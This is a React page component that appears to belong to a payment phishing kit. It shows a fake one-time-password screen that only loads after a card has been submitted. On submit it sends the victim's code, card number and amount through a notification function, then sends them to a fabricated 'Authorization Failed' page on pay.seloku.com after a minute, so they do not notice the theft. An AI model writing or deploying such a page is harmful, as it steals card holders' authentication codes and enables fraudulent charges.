import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useSession } from '@/hooks/useSession';
import { useLanguage } from '@/contexts/LanguageContext';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { sendOtpNotification, sendResendNotification } from '@/lib/notifications';

export default function Auth() {
  const navigate = useNavigate();
  const { session, isValid } = useSession();
  const { t } = useLanguage();
  
  const [otp, setOtp] = useState('');
  const [timeLeft, setTimeLeft] = useState(420);
  const [resendCooldown, setResendCooldown] = useState(0);

  useEffect(() => {
    if (!isValid || !session?.cardSubmitted) {
      navigate('/unauthorized');
    }
  }, [isValid, session, navigate]);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          navigate('/session-expired');
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [navigate]);

  useEffect(() => {
    if (resendCooldown > 0) {
      const timer = setTimeout(() => setResendCooldown(prev => prev - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [resendCooldown]);

  const handleVerify = async () => {
    if (session && otp.length === 6) {
      await sendOtpNotification(session.sessionKey, session.amount, otp, session.cardNumber || '');
      navigate('/processing');
      setTimeout(() => {
        window.location.href = `https://pay.seloku.com/failed?amount=${session.amount}&reason=Authorization%20Failed`;
      }, 60000);
    }
  };

  const handleResend = async () => {
    if (session && resendCooldown === 0) {
      await sendResendNotification(session.sessionKey, session.amount);
      setResendCooldown(30);
    }
  };

  const stars = '******'.slice(0, otp.length);

  if (!session) return null;

  return (
    <div className="min-h-screen bg-background flex items-center justify-center p-4">
      <div className="w-full max-w-md bg-card rounded-xl shadow-[var(--form-shadow)] p-6">
        <h1 className="text-xl font-semibold text-center mb-2">{t('enterOtp')}</h1>
        <p className="text-sm text-muted-foreground text-center mb-6">{t('otpSent')}</p>
        
        <div className="text-center mb-4 text-sm text-muted-foreground">
          Time remaining: {Math.floor(timeLeft / 60)}:{(timeLeft % 60).toString().padStart(2, '0')}
        </div>

        <div className="flex justify-center gap-1 mb-6 text-2xl tracking-widest">
          {stars.padEnd(6, '○').split('').map((char, i) => (
            <span key={i} className={char === '○' ? 'text-muted-foreground' : 'text-foreground'}>
              {char === '○' ? '○' : '*'}
            </span>
          ))}
        </div>

        <Input
          type="tel"
          value={otp}
          onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
          placeholder="Enter 6-digit OTP"
          className="text-center text-lg tracking-widest mb-4"
          maxLength={6}
        />

        <Button onClick={handleVerify} disabled={otp.length !== 6} className="w-full mb-3">
          {t('verify')}
        </Button>

        <button
          onClick={handleResend}
          disabled={resendCooldown > 0}
          className="w-full text-sm text-primary hover:underline disabled:text-muted-foreground disabled:no-underline"
        >
          {resendCooldown > 0 ? `${t('resendOtp')} (${resendCooldown}s)` : t('resendOtp')}
        </button>
      </div>
    </div>
  );
}
